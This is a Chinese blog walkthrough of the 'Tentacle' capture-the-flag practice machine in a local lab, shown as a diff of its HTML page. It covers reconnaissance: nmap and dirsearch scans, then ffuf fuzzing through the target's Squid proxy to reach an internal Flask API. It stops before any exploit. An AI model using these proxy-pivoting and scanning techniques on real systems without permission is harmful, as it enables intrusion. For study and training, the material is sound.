@@ -1,0 +1,817 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="山然">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="1. 目标信息 靶机：Tentacle 作者：Sublarge (QQ: 1469196548) 靶机ID: 605 系统：Linux 难度：Medium 靶机IP: 192.168.56.21 攻击机IP: 192.168.56.2(Kali Linux)  2. 信息收集2.1端口扫描123456789101112131415161718192021# Nmap 7.94SVN scan in">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tentacle">
+<meta property="og:url" content="https://shanran123.github.io/2026/03/30/Tentacle-%E5%B1%B1%E7%84%B6/index.html">
+<meta property="og:site_name" content="山然的学习小窝">
+<meta property="og:description" content="1. 目标信息 靶机：Tentacle 作者：Sublarge (QQ: 1469196548) 靶机ID: 605 系统：Linux 难度：Medium 靶机IP: 192.168.56.21 攻击机IP: 192.168.56.2(Kali Linux)  2. 信息收集2.1端口扫描123456789101112131415161718192021# Nmap 7.94SVN scan in">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774833530332-ed4cf62e-7084-4b47-8a05-cb9da340cf5d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774833777213-6d09d5ab-fc28-41aa-a16d-7795236c6888.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774834132064-d0901f00-33ab-46fb-8d0f-4c6250b90b69.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774834991501-cba71b67-95fc-4998-8d8e-78183d4e16d4.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774835506353-2e9886ee-1202-4721-9e04-1790bd270b62.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774835755776-24233150-dbbb-4b6f-9786-c96235c9d3b3.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774835787102-2c242780-cbb5-4896-95b3-7feb5199914d.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774835838501-662f859a-e0fe-468a-a052-22d0d97eee6a.png">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2026/jpeg/49970571/1774836494088-413bb601-49f6-4fe1-8e25-edfc136c84ae.jpeg">
+<meta property="article:published_time" content="2026-03-30T07:00:00.000Z">
+<meta property="article:modified_time" content="2026-03-30T07:00:40.239Z">
+<meta property="article:author" content="山然">
+<meta property="article:tag" content="靶场复现">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2026/png/49970571/1774833530332-ed4cf62e-7084-4b47-8a05-cb9da340cf5d.png">
+  
+  
+  
+  <title>Tentacle - 山然的学习小窝</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"shanran123.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Tentacle"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-03-30 15:00" pubdate>
+          2026年3月30日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Tentacle</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="1-目标信息"><a href="#1-目标信息" class="headerlink" title="1. 目标信息"></a>1. 目标信息</h2><ul>
+<li><strong>靶机：Tentacle</strong></li>
+<li><strong>作者：Sublarge (QQ: 1469196548)</strong></li>
+<li><strong>靶机ID: 605</strong></li>
+<li><strong>系统：Linux</strong></li>
+<li><strong>难度：Medium</strong></li>
+<li><strong>靶机IP: 192.168.56.21</strong></li>
+<li><strong>攻击机IP: 192.168.56.2(Kali Linux)</strong></li>
+</ul>
+<h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2. 信息收集"></a><strong>2. 信息收集</strong></h2><h3 id="2-1端口扫描"><a href="#2-1端口扫描" class="headerlink" title="2.1端口扫描"></a><strong>2.1端口扫描</strong></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"># Nmap <span class="hljs-number">7.94</span>SVN scan initiated Sun Mar <span class="hljs-number">29</span> <span class="hljs-number">20</span>:<span class="hljs-number">49</span>:<span class="hljs-number">34</span> <span class="hljs-number">2026</span> as: nmap -vvv -p <span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">3128</span> <span class="hljs-number">-4</span> -sCV -oN port <span class="hljs-number">192.168</span>.<span class="hljs-number">56.21</span><br>Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">56.21</span><br>Host is up, received arp-response (<span class="hljs-number">0.00036</span>s latency).<br>Scanned at <span class="hljs-number">2026</span><span class="hljs-number">-03</span><span class="hljs-number">-29</span> <span class="hljs-number">20</span>:<span class="hljs-number">49</span>:<span class="hljs-number">34</span> EDT <span class="hljs-keyword">for</span> <span class="hljs-number">32</span>s<br><br>PORT     STATE SERVICE    REASON         VERSION<br><span class="hljs-number">22</span>/tcp   open  ssh        syn-ack ttl <span class="hljs-number">64</span> OpenSSH <span class="hljs-number">10.0</span> (protocol <span class="hljs-number">2.0</span>)<br><span class="hljs-number">80</span>/tcp   open  http       syn-ack ttl <span class="hljs-number">64</span> Apache httpd <span class="hljs-number">2.4</span>.<span class="hljs-number">66</span> ((Unix))<br>|_http-title: Tentacle Systems | Global Infrastructure<br>| http-methods: <br>|   Supported Methods: GET POST OPTIONS HEAD TRACE<br>|_  Potentially risky methods: TRACE<br>|_http-server-header: Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">66</span> (Unix)<br><span class="hljs-number">3128</span>/tcp open  http-proxy syn-ack ttl <span class="hljs-number">64</span> Squid http proxy <span class="hljs-number">6.12</span><br>|_http-server-header: squid/<span class="hljs-number">6.12</span><br>|_http-title: ERROR: The requested URL could not be retrieved<br>MAC Address: <span class="hljs-number">08</span>:<span class="hljs-number">00</span>:<span class="hljs-number">27</span>:<span class="hljs-number">81</span>:A5:<span class="hljs-number">59</span> (Oracle VirtualBox virtual NIC)<br><br>Read data files from: /usr/bin/../share/nmap<br>Service detection performed. Please report any incorrect results at https:<span class="hljs-comment">//nmap.org/submit/ .</span><br># Nmap done at Sun Mar <span class="hljs-number">29</span> <span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">06</span> <span class="hljs-number">2026</span> -- <span class="hljs-number">1</span> IP <span class="hljs-title function_">address</span> <span class="hljs-params">(<span class="hljs-number">1</span> host up)</span> scanned in 31.88 seconds<br></code></pre></td></tr></table></figure>
+
+<p>开放22，80，3128端口</p>
+<p>22端口没什么信息，80端口是个静态页面。 3128 是著名开源代理缓存服务器软件 <strong>Squid Proxy</strong> 的默认监听端口。  那我们还得挂上这个代理继续进行信息搜集</p>
+<h3 id="2-2目录扫描"><a href="#2-2目录扫描" class="headerlink" title="2.2目录扫描"></a>2.2目录扫描</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c">di  dirsearch -u http:<span class="hljs-comment">//192.168.56.21</span><br>/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:<span class="hljs-number">23</span>: DeprecationWarning: pkg_resources is deprecated as an API. See https:<span class="hljs-comment">//setuptools.pypa.io/en/latest/pkg_resources.html</span><br>  from pkg_resources import DistributionNotFound, VersionConflict<br><br>  _|. _ _  _  _  _ _|_    v0.<span class="hljs-number">4.3</span><br> (_||| _) (/_(_|| (_| )<br><br>Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: <span class="hljs-number">25</span> | Wordlist size: <span class="hljs-number">11460</span><br><br>Output File: /range/Tentacle1/reports/http_192.<span class="hljs-number">168.56</span>.<span class="hljs-number">21</span>/_26<span class="hljs-number">-03</span><span class="hljs-number">-29</span>_20<span class="hljs-number">-50</span><span class="hljs-number">-38.</span>txt<br><br>Target: http:<span class="hljs-comment">//192.168.56.21/</span><br><br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">38</span>] Starting: <br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.ht_wsr.txt<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htaccess.bak1<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htaccess.orig<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htaccess.save<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htaccess.sample<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htaccess_sc<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htaccess_extra<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htaccess_orig<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htaccessOLD<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htaccessBAK<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htaccessOLD2<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htm<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.html<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htpasswd_test<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.httr-oauth<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">39</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /.htpasswds<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">51</span>] <span class="hljs-number">200</span> -  <span class="hljs-number">820B</span>  - /cgi-bin/printenv<br>[<span class="hljs-number">20</span>:<span class="hljs-number">50</span>:<span class="hljs-number">51</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">1</span>KB - /cgi-bin/test-cgi<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">14</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /server-status<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">14</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /server-status/<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">18</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~apache<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~bin<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~daemon<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~ftp<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~games<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~halt<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~guest<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~lp<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~mail<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~nobody<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~news<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">356B</span>  - /~operator  -&gt;  http:<span class="hljs-comment">//192.168.56.21/~operator/</span><br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~root<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~shutdown<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~sync<br>[<span class="hljs-number">20</span>:<span class="hljs-number">51</span>:<span class="hljs-number">19</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">316B</span>  - /~uucp<br><br></code></pre></td></tr></table></figure>
+
+<p>发现有</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plain">/cgi-bin/printenv<br>/cgi-bin/test-cgi<br>/~operator<br></code></pre></td></tr></table></figure>
+
+<p>前两个没啥用 第三个&#x2F;~operator 打开依然是静态页面</p>
+<p>那就从代理入手</p>
+<h3 id="2-3squid代理-信息搜集"><a href="#2-3squid代理-信息搜集" class="headerlink" title="2.3squid代理-&gt;信息搜集"></a>2.3squid代理-&gt;信息搜集</h3><h4 id="2-3-1端口扫描"><a href="#2-3-1端口扫描" class="headerlink" title="2.3.1端口扫描"></a>2.3.1端口扫描</h4><p>之前试了试proxychains+nmap 扫不出来</p>
+<p>然后使用ffuf可以扫描到</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plain">seq 1 10000 | ffuf -w - -u http://127.0.0.1:FUZZ/ -fc 404,503 -x http://192.168.56.21:3128<br>5000                    [Status: 200, Size: 63, Words: 5, Lines: 1, Duration: 15ms]<br></code></pre></td></tr></table></figure>
+
+<p>发现5000端口是开放的</p>
+<p>curl一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">└─# curl -i -s -x http://192.168.56.21:3128 http://127.0.0.1:5000/  <br>HTTP/1.1 200 OK<br>Server: Werkzeug/3.1.6 Python/3.12.12<br>Date: Mon, 30 Mar 2026 01:11:58 GMT<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 63<br>Cache-Status: Tentacle;fwd=stale;detail=match<br>Via: 1.1 Tentacle (squid/6.12)<br>Connection: keep-alive<br><br>&lt;h1&gt;Tentacle Internal Management API&lt;/h1&gt;&lt;p&gt;Status: Running&lt;/p&gt;    <br></code></pre></td></tr></table></figure>
+
+<p> 这说明跑在 5000 端口上的 “Internal API” 是一个基于 <strong>Python Flask</strong> 框架开发的 Web 应用。  </p>
+<h4 id="2-3-2目录扫描"><a href="#2-3-2目录扫描" class="headerlink" title="2.3.2目录扫描"></a>2.3.2目录扫描</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs plain">└─# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://127.0.0.1:5000/FUZZ -fc 404 -x http://192.168.56.21:3128<br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\       <br>       /\ \__/ /\ \__/  __  __  /\ \__/       <br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      <br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      <br>         \ \_\   \ \_\  \ \____/  \ \_\       <br>          \/_/    \/_/   \/___/    \/_/       <br><br>       v2.1.0-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://127.0.0.1:5000/FUZZ<br> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Proxy            : http://192.168.56.21:3128<br> :: Timeout          : 10<br> :: Threads          : 40<br> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500<br> :: Filter           : Response status: 404<br>________________________________________________<br><br>api                     [Status: 403, Size: 76, Words: 8, Lines: 2, Duration: 126ms]<br>:: Progress: [4634/4634] :: Job [1/1] :: 481 req/sec :: Duration: [0:00:10] :: Errors: 0 ::<br></code></pre></td></tr></table></figure>
+
+<p>发现api路径 但还是403 继续fuzz</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plain">└─# ffuf -w /usr/share/wordlists/dirb/common.txt -u http://127.0.0.1:5000/api/FUZZ -fc 404 -x http://192.168.56.21:3128<br><br>        /&#x27;___\  /&#x27;___\           /&#x27;___\       <br>       /\ \__/ /\ \__/  __  __  /\ \__/       <br>       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      <br>        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      <br>         \ \_\   \ \_\  \ \____/  \ \_\       <br>          \/_/    \/_/   \/___/    \/_/       <br><br>       v2.1.0-dev<br>________________________________________________<br><br> :: Method           : GET<br> :: URL              : http://127.0.0.1:5000/api/FUZZ<br> :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt<br> :: Follow redirects : false<br> :: Calibration      : false<br> :: Proxy            : http://192.168.56.21:3128<br> :: Timeout          : 10<br> :: Threads          : 40<br> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500<br> :: Filter           : Response status: 404<br>________________________________________________<br><br>deploy                  [Status: 405, Size: 153, Words: 16, Lines: 6, Duration: 76ms]<br>status                  [Status: 200, Size: 81, Words: 1, Lines: 2, Duration: 153ms]<br>:: Progress: [4634/4634] :: Job [1/1] :: 296 req/sec :: Duration: [0:00:10] :: Errors: 0 ::<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>**status**</code>** [Status: 200]**：状态接口，通常会泄露系统版本、运行时间或内部路径。</li>
+<li><code>**deploy**</code>** [Status: 405]**：部署接口，这是极其高危的 RCE（远程代码执行）潜在点！</li>
+</ul>
+<p>访问&#x2F;api&#x2F;status</p>
